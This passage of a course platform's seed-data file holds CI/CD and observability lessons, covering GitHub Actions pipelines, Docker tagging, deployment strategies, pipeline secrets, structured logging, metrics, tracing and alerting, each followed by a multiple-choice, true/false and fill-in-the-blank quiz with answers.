          type: 'FILL_BLANK',
          prompt: 'The actions/____@v4 action clones your repository onto the runner, without it the runner starts with an empty filesystem.',
          options: [],
          answer: 'checkout',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Jobs in a workflow run in parallel by default unless one specifies needs to depend on another.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What happens to a job with needs: test if the test job fails?',
          options: ['It runs anyway', 'It is skipped', 'It runs twice', 'It automatically fixes the test'],
          answer: 'It is skipped',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A runner is a persistent, long-lived server that keeps state between workflow runs.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A packaged, reusable workflow step that someone else already wrote, referenced with uses:, is called an ____.',
          options: [],
          answer: 'action',
        },
      ],
    },
  },
  {
    title: 'Automated Testing in the Pipeline',
    content: lessonContent(
      'Automated Testing in the Pipeline',
      `A pipeline that doesn't run your test suite isn't really "CI", it's just automated building. This lesson covers making tests a real, fast, reliable gate in your pipeline.\n\n## Fail fast\n\n\`\`\`yaml\njobs:\n  ci:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with: { node-version: '20' }\n      - run: npm ci\n      - run: npm run lint\n      - run: npm run typecheck\n      - run: npm test\n\`\`\`\n\nSteps run in order and **stop at the first failure** by default, if \`npm run lint\` fails, \`npm test\` never runs, no point spending minutes running a full test suite against code that doesn't even pass linting.\n\n## Caching dependencies\n\nReinstalling every dependency from scratch on every single run wastes minutes per build, adding up fast across a busy repository. Caching the package manager's download cache (not \`node_modules\` itself, which can hide subtle bugs if reused stale) speeds this up significantly:\n\n\`\`\`yaml\n- uses: actions/setup-node@v4\n  with:\n    node-version: '20'\n    cache: 'npm'\n\`\`\`\n\n\`setup-node\`'s built-in \`cache: 'npm'\` option automatically caches and restores npm's download cache between runs, keyed on your lockfile, install still runs, but mostly from local cache instead of re-downloading everything.\n\n## Test matrices\n\nTo verify your code works across multiple versions or environments, define a **matrix**, GitHub Actions runs the job once per combination automatically:\n\n\`\`\`yaml\njobs:\n  test:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        node-version: ['18', '20', '22']\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: \${{ matrix.node-version }}\n      - run: npm ci && npm test\n\`\`\`\n\nThis runs the exact same job three times, once per Node version, in parallel, catching version-specific breakage before a user does.\n\n> [!WARNING]\n> A flaky test (one that sometimes fails for no code-related reason, a timing issue, a shared test database) is worse than a slow test, it trains your team to re-run failed pipelines out of habit instead of trusting red as "something is actually wrong". Fix or quarantine flaky tests aggressively.`
    ),
    quiz: {
      title: 'Automated Testing Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'TRUE_FALSE',
          prompt: 'By default, if an earlier step in a job fails, later steps in that same job still run.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does setup-node's cache: 'npm' option do?",
          options: [
            'Caches node_modules directly',
            "Caches npm's download cache, keyed on your lockfile",
            'Skips running npm install entirely',
            'Disables tests',
          ],
          answer: "Caches npm's download cache, keyed on your lockfile",
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A strategy: ____ block runs the same job multiple times, once per combination of specified values (like Node versions).',
          options: [],
          answer: 'matrix',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Caching node_modules directly, rather than the package manager download cache, can hide subtle bugs if reused stale.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why is a flaky test considered worse than a slow one?',
          options: ['It costs more money', 'It trains the team to distrust and ignore failures', 'It cannot be fixed', 'It only affects one branch'],
          answer: 'It trains the team to distrust and ignore failures',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Running lint and typecheck before the full test suite, so a broken build fails immediately, is often called failing ____.',
          options: [],
          answer: 'fast',
        },
      ],
    },
  },
  {
    title: 'Build Artifacts and Docker Images in CI',
    content: lessonContent(
      'Build Artifacts and Docker Images in CI',
      `Once tests pass, most pipelines produce something deployable, a compiled binary, a bundled frontend, or, very commonly today, a **Docker image**. This lesson builds and pushes one from CI.\n\n## Building and pushing an image\n\n\`\`\`yaml\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Log in to registry\n        uses: docker/login-action@v3\n        with:\n          username: \${{ secrets.REGISTRY_USER }}\n          password: \${{ secrets.REGISTRY_TOKEN }}\n      - name: Build and push\n        run: |\n          docker build -t myregistry/web:\${{ github.sha }} .\n          docker push myregistry/web:\${{ github.sha }}\n\`\`\`\n\n\`secrets.REGISTRY_USER\`/\`REGISTRY_TOKEN\` pull encrypted repository secrets into the workflow at runtime, never hardcode credentials directly in the YAML (covered in more depth in the secrets-management lesson).\n\n## Tagging strategy\n\nTagging every image build matters more than it looks: it's how you know exactly what's running, and how you roll back.\n\n| Tag style | Example | Tradeoff |\n|---|---|---|\n| Commit SHA | \`web:a1b2c3d\` | Always unique, traces directly to exact code, not human-friendly |\n| Semantic version | \`web:1.4.2\` | Human-friendly, requires a versioning/release process |\n| \`latest\` | \`web:latest\` | Convenient, but ambiguous, "latest" changes meaning over time, avoid for production deploys |\n\nA common, robust approach: always tag with the commit SHA (guaranteed unique, always traceable), and *additionally* tag stable releases with a semantic version for human readability.\n\n## Uploading build artifacts\n\nNot every pipeline needs a Docker image, sometimes you just need to pass a build output (a compiled bundle, a test report) from one job to another:\n\n\`\`\`yaml\n- uses: actions/upload-artifact@v4\n  with:\n    name: dist\n    path: dist/\n\n# in a later job:\n- uses: actions/download-artifact@v4\n  with:\n    name: dist\n\`\`\`\n\n> [!NOTE]\n> Artifacts uploaded with \`upload-artifact\` are how you pass files **between jobs** in the same workflow run (each job gets its own fresh runner with no shared filesystem), it's not for long-term storage, that's what a registry or object storage (like S3) is for.`
    ),
    quiz: {
      title: 'Build Artifacts & Images Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why should you avoid deploying with only the latest tag in production?',
          options: [
            'latest is not a valid Docker tag',
            'latest is ambiguous and changes meaning over time',
            'latest images are always broken',
            'Docker does not support tags',
          ],
          answer: 'latest is ambiguous and changes meaning over time',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Tagging a Docker image with the commit ____ guarantees a unique tag that always traces back to the exact code that built it.',
          options: [],
          answer: 'SHA',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Repository secrets like registry credentials should be hardcoded directly into the workflow YAML for simplicity.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is actions/upload-artifact used for?',
          options: ['Deploying to production', 'Passing files between jobs in the same workflow run', 'Encrypting secrets', 'Building Docker images'],
          answer: 'Passing files between jobs in the same workflow run',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Each job in a workflow run gets its own fresh runner with no filesystem shared with other jobs by default.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What's a common, robust Docker tagging approach?",
          options: [
            'Only ever use latest',
            'Tag with the commit SHA always, and additionally a semantic version for stable releases',
            'Never tag images',
            'Use a random UUID for every tag',
          ],
          answer: 'Tag with the commit SHA always, and additionally a semantic version for stable releases',
        },
      ],
    },
  },
  {
    title: 'Continuous Deployment Strategies',
    content: lessonContent(
      'Continuous Deployment Strategies',
      `Getting a new build out doesn't have to mean "stop the old version, start the new one" (and the downtime that implies). Different deployment strategies trade off complexity for safety and zero-downtime releases.\n\n## Rolling deployment\n\nReplace old instances/Pods with new ones gradually, a few at a time, as covered in the Kubernetes course's Deployments lesson, this is the default behavior for a Kubernetes Deployment. At any moment, some traffic hits the old version and some hits the new one.\n\n## Blue-green deployment\n\nRun two full, identical environments, **blue** (currently live) and **green** (the new version), deploy entirely to green, test it for real, then switch all traffic over atomically:\n\n\`\`\`\nBefore:  Router → Blue (v1.4)     Green (v1.5, idle)\nSwitch:  Router → Blue (v1.4, idle)     Green (v1.5)\n\`\`\`\n\nIf something's wrong with green, you switch traffic straight back to blue, instant rollback, no redeploying anything. The cost: you need double the infrastructure running during the switch.\n\n## Canary deployment\n\nSend a small percentage of real traffic (say 5%) to the new version, watch error rates and latency, then gradually increase that percentage if everything looks healthy:\n\n\`\`\`\n5% of traffic  → v1.5 (canary)\n95% of traffic → v1.4 (stable)\n\`\`\`\n\nThis catches problems that only show up under real production traffic and load, while limiting the blast radius to a small slice of users if something's wrong.\n\n## Feature flags: decoupling deploy from release\n\nA **feature flag** wraps new code in a runtime toggle, so the code can be deployed to production while still being turned *off* for real users:\n\n\`\`\`\nif (featureFlags.isEnabled('new-checkout')) {\n  return renderNewCheckout();\n}\nreturn renderOldCheckout();\n\`\`\`\n\nThis separates two things that rolling/blue-green/canary strategies bundle together: *deploying* code (getting it running in production) and *releasing* a feature (turning it on for users). You can deploy on Tuesday and flip the flag on Friday, no redeploy needed, and instantly turn it back off if something's wrong.\n\n> [!TIP]\n> These strategies aren't mutually exclusive, a very common real setup is: canary + feature flags together, deploy the new version to a small percentage of infrastructure (canary), with the risky new behavior additionally behind a flag that's off by default, two independent safety nets instead of one.`
    ),
    quiz: {
      title: 'Deployment Strategies Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "In a blue-green deployment, what happens if something's wrong with the new (green) version after switching?",
          options: [
            'You must redeploy from scratch',
            'You switch traffic straight back to blue instantly',
            'The whole app goes down',
            'You wait 24 hours for it to fix itself',
          ],
          answer: 'You switch traffic straight back to blue instantly',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A canary deployment sends all traffic to the new version immediately.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____ flag wraps new code in a runtime toggle, decoupling deploying code from releasing a feature to users.',
          options: [],
          answer: 'feature',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main cost of a blue-green deployment strategy?',
          options: [
            "It's slower than rolling deployments",
            'You need double the infrastructure running during the switch',
            'It cannot be automated',
            'It requires downtime',
          ],
          answer: 'You need double the infrastructure running during the switch',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'With feature flags, you can deploy code to production while keeping it turned off for real users.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____ deployment sends a small percentage of real traffic to the new version before gradually increasing it.',
          options: [],
          answer: 'canary',
        },
      ],
    },
  },
  {
    title: 'Secrets and Environment Management in Pipelines',
    content: lessonContent(
      'Secrets and Environment Management in Pipelines',
      `A pipeline that builds and deploys your app almost always needs credentials, registry logins, cloud provider access, database passwords. Handling these safely is one of the most consequential parts of CI/CD to get right.\n\n## Repository/organization secrets\n\nCI platforms provide an encrypted secrets store separate from your code, referenced in workflows without ever appearing in the YAML or logs:\n\n\`\`\`yaml\nsteps:\n  - name: Deploy\n    env:\n      AWS_ACCESS_KEY_ID: \${{ secrets.AWS_ACCESS_KEY_ID }}\n      AWS_SECRET_ACCESS_KEY: \${{ secrets.AWS_SECRET_ACCESS_KEY }}\n    run: ./deploy.sh\n\`\`\`\n\nGitHub Actions automatically **redacts** any value matching a registered secret from logs, if a step accidentally echoes \`$AWS_SECRET_ACCESS_KEY\`, the log shows \`***\` instead of the real value.\n\n## Least-privilege deploy credentials\n\nThe credentials your pipeline uses to deploy should follow the same rule as everything else: only what's needed. A pipeline deploying a static site to one S3 bucket doesn't need account-wide admin access, give it a role/user scoped to exactly that bucket (and nothing else), the same IAM principle from the AWS course, applied to your CI system's credentials specifically.\n\n## Environment-specific configuration\n\nDifferent environments (staging, production) usually need different config: different database URLs, different feature flag defaults, different API keys. GitHub Actions **Environments** let you scope secrets and required approvals per environment:\n\n\`\`\`yaml\njobs:\n  deploy-production:\n    environment: production\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./deploy.sh\n\`\`\`\n\nAn \`environment: production\` job can require manual approval before running, and only has access to secrets scoped to that environment, \`staging\` secrets and \`production\` secrets never mix, even within the same repository.\n\n## OIDC: no long-lived secrets at all\n\nThe most modern approach skips storing cloud credentials as secrets entirely: **OIDC (OpenID Connect)** lets your CI platform request short-lived, auto-expiring credentials directly from your cloud provider for each run, nothing long-lived to leak in the first place.\n\n> [!WARNING]\n> A leaked CI secret is one of the most common ways real production incidents start, because CI credentials are often broader than they need to be ("just give it admin, it's easier"). Treat pipeline credentials with the exact same least-privilege scrutiny you'd apply to a human's access.`
    ),
    quiz: {
      title: 'Pipeline Secrets Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does GitHub Actions do if a step's output accidentally contains a registered secret's value?",
          options: [
            'It crashes the workflow',
            'It redacts the value in logs, showing *** instead',
            'It emails the repository owner',
            'Nothing, it prints the value in plain text',
          ],
          answer: 'It redacts the value in logs, showing *** instead',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "A pipeline's deploy credentials should have broad, account-wide access to make deployment simpler.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'GitHub Actions ____ let you scope secrets and require manual approval per deployment target like staging or production.',
          options: [],
          answer: 'Environments',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does OIDC let a CI platform do?',
          options: [
            'Store secrets in plain text',
            'Request short-lived, auto-expiring credentials from a cloud provider for each run',
            'Skip running tests',
            'Bypass IAM entirely',
          ],
          answer: 'Request short-lived, auto-expiring credentials from a cloud provider for each run',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Staging and production secrets scoped to different GitHub Actions Environments are automatically kept separate, even in the same repository.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A leaked CI ____ is one of the most common ways real production security incidents start.',
          options: [],
          answer: 'secret',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Full CI/CD Pipeline for a Sample App',
    content: lessonContent(
      'Final Project: Build a Full CI/CD Pipeline for a Sample App',
      `Bring every piece together into one real, working pipeline for a small application of your choice.\n\n## Requirements\n\n1. Set up a GitHub Actions workflow that runs on every push and pull request: install dependencies, lint, and run the test suite, failing fast if any step fails.\n2. Cache dependencies so repeated runs are meaningfully faster than a cold run.\n3. Build a Docker image of your app in the pipeline and tag it with the commit SHA.\n4. Add a separate deploy job that only runs after the test job succeeds (\`needs:\`), deploying your image somewhere real (a container registry at minimum, a running service if you want to go further).\n5. Use at least one repository secret for a credential your pipeline needs, never hardcoded in the workflow file.\n\n## Stretch goals\n\n- Add a test matrix running your suite against two different runtime versions.\n- Use a GitHub Actions Environment with a required manual approval step before deploying to "production".\n- Add a simple feature flag to your app, and deploy a new feature behind it, turned off by default.\n\nSubmit a link to your finished project (a repo with your workflow file, and a note on what it actually deploys to) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const observabilityLessons: SeedLesson[] = [
  {
    title: 'The Three Pillars: Logs, Metrics, and Traces',
    content: lessonContent(
      'The Three Pillars: Logs, Metrics, and Traces',
      `**Observability** is the ability to understand what's happening inside a running system just from what it exposes externally, without having to guess or attach a debugger to production. It's usually broken down into three complementary signal types.\n\n## Monitoring vs. observability\n\n**Monitoring** answers questions you already thought to ask ahead of time ("is CPU usage above 80%?"). **Observability** is what lets you answer questions you *didn't* anticipate when something goes wrong at 3am ("why are only requests from mobile clients in the EU slow, and only since 20 minutes ago?"), by exploring the raw signals your system emits.\n\n## The three pillars\n\n| Pillar | Answers | Example |\n|---|---|---|\n| **Logs** | What happened, in detail, at a specific point | "User 42's payment failed: card declined" |\n| **Metrics** | How much/how many, over time | "Requests per second", "p99 latency" |\n| **Traces** | How a single request flowed through multiple services | "Request hit API → auth service (12ms) → database (340ms) → response" |\n\nNone of the three replaces the others, metrics tell you *something* is wrong and roughly when, logs tell you the specific detail of what happened, traces tell you *where* in a multi-service request the time actually went.\n\n## A concrete example\n\nImagine checkout latency suddenly spikes:\n1. A **metric** (p99 latency dashboard) shows the spike started at 14:32 and is ongoing.\n2. A **trace** for a slow request shows 90% of the time is spent in a call to the inventory service.\n3. **Logs** from the inventory service around that time show repeated database connection timeout errors.\n\nEach pillar narrowed the investigation, from "something is slow" to "which service" to "the exact underlying error", in minutes instead of hours of guessing.\n\n> [!NOTE]\n> This course focuses on the concepts and vendor-agnostic tools (structured logging, Prometheus-style metrics, OpenTelemetry), the same ideas apply whether you're using a cloud provider's built-in tools, a self-hosted stack, or a dedicated observability vendor.`
    ),
    quiz: {
      title: 'Observability Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What's the key difference between monitoring and observability?",
          options: [
            'They are exactly the same thing',
            'Monitoring answers pre-defined questions, observability lets you explore unanticipated questions',
            'Observability only works for Kubernetes',
            'Monitoring is newer than observability',
          ],
          answer: 'Monitoring answers pre-defined questions, observability lets you explore unanticipated questions',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which pillar tells you how a single request flowed through multiple services?',
          options: ['Logs', 'Metrics', 'Traces', 'Alerts'],
          answer: 'Traces',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Metrics can tell you the specific detailed reason a single request failed.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: "The pillar that answers 'how much/how many, over time' is ____.",
          options: [],
          answer: 'Metrics',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The three pillars of observability are redundant with each other, so you only need one.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "In the checkout latency example, what narrowed the investigation from 'something is slow' to the exact root cause?",
          options: [
            'Guessing randomly',
            'Using metrics, then a trace, then logs together',
            'Restarting the service repeatedly',
            'Ignoring the issue until it resolved itself',
          ],
          answer: 'Using metrics, then a trace, then logs together',
        },
      ],
    },
  },
  {
    title: 'Structured Logging Done Right',
    content: lessonContent(
      'Structured Logging Done Right',
      `A log line like \`Payment failed for user\` is easy for a human to read once, and nearly useless to search, filter, or aggregate across millions of log lines. **Structured logging** fixes that by emitting logs as data, not prose.\n\n## Plain text vs. structured\n\n\`\`\`\n# Plain text\nPayment failed for user 42, card declined, order #8817\n\n# Structured (JSON)\n{"level": "error", "event": "payment_failed", "userId": 42, "orderId": 8817, "reason": "card_declined", "timestamp": "2026-07-08T14:32:01Z"}\n\`\`\`\n\nThe structured version is trivial to query ("show me every \`payment_failed\` event where \`reason = card_declined\` in the last hour"), the plain-text version requires fragile regex or full-text search across free-form sentences that might not even be phrased consistently between developers.\n\n## Log levels\n\nEvery log line should carry a **level**, indicating urgency and who needs to see it:\n\n| Level | Meaning |\n|---|---|\n| \`debug\` | Detailed diagnostic info, useful in development, usually off in production |\n| \`info\` | Normal operational events (a request completed, a job started) |\n| \`warn\` | Something unexpected, but not (yet) a failure |\n| \`error\` | An operation failed |\n\nBeing disciplined about levels means production can run at \`info\` and above by default, keeping log volume (and cost) manageable, while \`debug\` is available to flip on temporarily when actively investigating something.\n\n## Correlation IDs\n\nA single user action often triggers work across multiple services, correlating all their logs together requires a shared identifier attached to every log line involved in handling that one request:\n\n\`\`\`\n{"event": "request_received", "correlationId": "req-9f8a", "path": "/checkout"}\n{"event": "payment_charged", "correlationId": "req-9f8a", "amount": 4999}\n{"event": "order_created", "correlationId": "req-9f8a", "orderId": 8817}\n\`\`\`\n\nGenerate a \`correlationId\` (or reuse the incoming one if the request came from another internal service) at the very start of handling a request, and pass it along to every downstream call and every log line for that request.\n\n> [!TIP]\n> If you can't answer "show me every log line related to this one specific user's specific failed request" in under a minute, your logging isn't structured enough yet, that query is the entire point of doing this.`
    ),
    quiz: {
      title: 'Structured Logging Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What's the main advantage of structured (JSON) logs over free-form text?",
          options: [
            'They take up less disk space always',
            'They are trivial to query and filter reliably',
            'They cannot be read by humans at all',
            'They replace the need for metrics',
          ],
          answer: 'They are trivial to query and filter reliably',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____ ID is a shared identifier attached to every log line involved in handling one specific request, letting you trace it across services.',
          options: [],
          answer: 'correlation',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "In production, it's common to run at info level and above by default, keeping debug logs available to enable temporarily.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which log level indicates an operation actually failed?',
          options: ['debug', 'info', 'warn', 'error'],
          answer: 'error',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Structured logging replaces the need for log levels entirely.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Being able to find every log line related to one specific failed request quickly is the whole point of ____ logging.',
          options: [],
          answer: 'structured',
        },
      ],
    },
  },
  {
    title: 'Metrics and Time-Series Data',
    content: lessonContent(
      'Metrics and Time-Series Data',
      `Logs tell you about individual events. **Metrics** aggregate numbers over time, letting you see trends, set alerts, and build dashboards without drowning in individual log lines.\n\n## The three basic metric types\n\n| Type | Behavior | Example |\n|---|---|---|\n| **Counter** | Only ever goes up (until reset) | Total requests served |\n| **Gauge** | Goes up or down freely | Current memory usage, active connections |\n| **Histogram** | Buckets observations to compute distributions | Request latency (so you can ask for p50/p95/p99) |\n\nA counter for \`http_requests_total\` doesn't tell you the request *rate*, but a monitoring system can compute the rate of change over time from a raw counter, which is usually what you actually want to graph.\n\n## Prometheus-style metrics\n\nA very common pattern (used by Prometheus and compatible with most modern monitoring stacks) is exposing metrics as plain text on an HTTP endpoint that a collector periodically scrapes:\n\n\`\`\`\n# HELP http_requests_total Total HTTP requests\n# TYPE http_requests_total counter\nhttp_requests_total{method="GET",status="200"} 84213\nhttp_requests_total{method="GET",status="500"} 12\n\n# HELP http_request_duration_seconds Request latency\n# TYPE http_request_duration_seconds histogram\nhttp_request_duration_seconds_bucket{le="0.1"} 79000\nhttp_request_duration_seconds_bucket{le="0.5"} 83900\nhttp_request_duration_seconds_bucket{le="+Inf"} 84225\n\`\`\`\n\nThe \`{method="GET",status="200"}\` part is a set of **labels**, letting you slice the same metric by dimensions (which method, which status code) without defining a separate metric name for every combination.\n\n## The cardinality trap\n\nLabels are powerful, but each unique combination of label values creates a separate time series stored and tracked individually. Adding a label like \`userId\` to a metric with millions of users creates millions of time series, this is called a **cardinality explosion**, and it can silently overwhelm a monitoring system's storage and query performance.\n\n> [!WARNING]\n> Never put unbounded, high-cardinality values (user IDs, email addresses, raw URLs with query strings, request IDs) directly into a metric's labels. Those belong in logs and traces instead, metric labels should stay to a bounded, relatively small set of values (a handful of environments, a handful of status codes, a handful of regions).`
    ),
    quiz: {
      title: 'Metrics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which metric type only ever increases (until it resets)?',
          options: ['Gauge', 'Counter', 'Histogram', 'Trace'],
          answer: 'Counter',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which metric type lets you compute percentiles like p95 latency?',
          options: ['Counter', 'Gauge', 'Histogram', 'Log level'],
          answer: 'Histogram',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A gauge metric can go both up and down, like current memory usage.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A set of key-value pairs attached to a metric, like method and status, letting you slice it by dimension, is called a ____.',
          options: [],
          answer: 'label',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Adding a high-cardinality label like userId to a metric is a safe, recommended practice.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Adding unbounded label values that create millions of separate time series is called a cardinality ____.',
          options: [],
          answer: 'explosion',
        },
      ],
    },
  },
  {
    title: 'Distributed Tracing',
    content: lessonContent(
      'Distributed Tracing',
      `A single user request in a microservices system might touch five, ten, or more services before a response comes back. When it's slow, "logs from each service" don't easily show you the full, connected picture, **distributed tracing** does.\n\n## Traces, spans, and context propagation\n\nA **trace** represents one end-to-end request, made up of multiple **spans**, each span is one unit of work (a single service call, a database query) with a start time, duration, and metadata.\n\n\`\`\`\nTrace: checkout-req-9f8a\n├── span: API gateway            (2ms)\n├── span: auth service check     (12ms)\n├── span: inventory service call (340ms)  ← the slow one\n│   └── span: inventory DB query (335ms)\n└── span: payment service call   (45ms)\n\`\`\`\n\nEach span records its **parent span**, building the tree above, so a tracing tool can render exactly where time was spent across the whole request, at a glance.\n\n## Propagating context across services\n\nFor this to work, a **trace context** (trace ID + current span ID) has to travel with the request as it hops between services, usually via an HTTP header:\n\n\`\`\`\ntraceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01\n\`\`\`\n\nEvery service in the chain reads the incoming trace context, creates its own span as a child of it, and passes the updated context along to whatever it calls next. Miss this step in even one service, and the trace breaks into two disconnected pieces there.\n\n## OpenTelemetry\n\n**OpenTelemetry (OTel)** is the current industry-standard, vendor-neutral way to instrument code for traces (and logs and metrics), instrument your code once with OTel's libraries, and send the data to whichever backend you choose (many are compatible), instead of locking your instrumentation to one specific vendor's proprietary SDK.\n\n\`\`\`\nimport { trace } from '@opentelemetry/api';\n\nconst tracer = trace.getTracer('inventory-service');\n\nasync function checkStock(itemId) {\n  return tracer.startActiveSpan('checkStock', async (span) => {\n    const result = await db.query(...);\n    span.end();\n    return result;\n  });\n}\n\`\`\`\n\n> [!NOTE]\n> A great deal of tracing's value comes for free once a service framework or library has built-in OTel instrumentation, HTTP frameworks, database clients, and message queues increasingly ship this out of the box, so you often get spans for the "boring" infrastructure calls without writing any tracing code yourself, and only add manual spans for the business logic you specifically want visibility into.`
    ),
    quiz: {
      title: 'Distributed Tracing Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is a span?',
          options: ['An entire trace', 'One unit of work within a trace, like a single service call', 'A type of log level', 'A metric label'],
          answer: 'One unit of work within a trace, like a single service call',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Trace context must travel with a request across service boundaries (e.g. via an HTTP header) for a trace to stay connected.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'If a service fails to propagate the incoming trace context to what it calls next, the trace ____ into disconnected pieces.',
          options: [],
          answer: 'breaks',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is OpenTelemetry?',
          options: [
            "A single vendor's proprietary monitoring product",
            'A vendor-neutral standard for instrumenting traces, logs, and metrics',
            'A database engine',
            'A container orchestrator',
          ],
          answer: 'A vendor-neutral standard for instrumenting traces, logs, and metrics',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Each span records its parent span, which is how a tracing tool reconstructs the full request tree.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Many HTTP frameworks and database clients now ship built-in ____ instrumentation, giving you spans for infrastructure calls with no extra code.',
          options: [],
          answer: 'OTel',
        },
      ],
    },
  },
  {
    title: 'Alerting Without Burning Out Your Team',
    content: lessonContent(
      'Alerting Without Burning Out Your Team',
      `Collecting logs, metrics, and traces is only useful if the right person finds out at the right time when something's actually wrong, without being paged for things that don't matter. Alerting is where observability turns into action.\n\n## SLIs, SLOs, and error budgets\n\n- **SLI (Service Level Indicator)**: a specific measurement, e.g. "percentage of requests completed successfully" or "p99 latency".\n- **SLO (Service Level Objective)**: a target for that indicator, e.g. "99.9% of requests succeed over a rolling 30 days".\n- **Error budget**: the amount of "failure" the SLO allows, 99.9% success means a 0.1% error budget, once you're consistently spending it faster than planned, that's a signal to slow down new releases and focus on stability instead of features.\n\n## Alert on symptoms, not causes\n\nA common mistake: alerting on every possible underlying cause ("CPU > 90%", "one Pod restarted", "disk usage > 80%") instead of on user-visible symptoms ("error rate > 1%", "p99 latency > 2s"). A single real incident can trigger dozens of cause-based alerts simultaneously, symptom-based alerts fire once, for the thing that actually matters to users.\n\n\`\`\`\n❌ Alert: "CPU usage above 90% on node-7"\n✅ Alert: "Error rate above 1% for checkout service, sustained 5 minutes"\n\`\`\`\n\n## Actionable alerts only\n\nEvery alert that pages a human should be something they can actually **act on**. If an alert fires and the response is always "check it, it's fine, go back to sleep", that's not an alert, that's noise, and it trains people to ignore the next one, including the real one.\n\n- Does this alert mean something is currently broken for users, or might be soon?\n- Is there a clear next action for whoever receives it?\n- Would ignoring this alert for an hour actually cause harm?\n\nIf the answer to any of these is "no", it probably shouldn't page anyone, it might still be worth a metric on a dashboard, just not a 3am notification.\n\n> [!WARNING]\n> **Alert fatigue** (too many low-value alerts) is one of the most common ways real incidents get missed, not because nobody was watching, but because everyone had learned to tune out the constant noise. A team with 5 alerts they trust completely responds faster than a team with 50 they've learned to dismiss.`
    ),
    quiz: {
      title: 'Alerting Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is an SLO?',
          options: [
            'A type of log format',
            'A target for a specific service level indicator, like 99.9% success rate',
            'A metric label',
            'A distributed tracing tool',
          ],
          answer: 'A target for a specific service level indicator, like 99.9% success rate',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The amount of allowed failure under an SLO (e.g. 0.1% for a 99.9% target) is called the error ____.',
          options: [],
          answer: 'budget',
        },
        {
          type: 'TRUE_FALSE',
